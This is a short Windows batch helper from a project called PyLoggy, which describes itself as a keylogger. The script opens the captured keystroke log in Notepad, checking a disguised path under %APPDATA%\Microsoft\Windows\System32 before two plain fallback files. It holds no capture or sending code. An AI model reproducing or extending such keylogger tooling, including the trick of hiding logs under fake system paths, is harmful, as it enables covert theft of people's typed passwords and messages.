@echo off
REM Change to project root
cd /d "%~dp0\.."

echo ========================================
echo PyLoggy - View Logs
echo ========================================
echo.
set LOG_PATH=%APPDATA%\Microsoft\Windows\System32\SystemLog.dat
if exist "%LOG_PATH%" (
    echo Found log file in hidden directory.
    echo Opening: %LOG_PATH%
    echo.
    notepad "%LOG_PATH%"
) else if exist "Logfile.txt" (
    echo Found log file in current directory (fallback).
    notepad Logfile.txt
) else if exist "output\Logfile.txt" (
    echo Found log file in output directory (fallback).
    notepad output\Logfile.txt
) else (
    echo Log file not found!
    echo.
    echo Expected locations:
    echo   - %LOG_PATH%
    echo   - Logfile.txt (current directory)
    echo   - output\Logfile.txt
    echo.
    echo Make sure you've run the keylogger first.
    echo Run: scripts\test.bat
    echo.
    pause
)
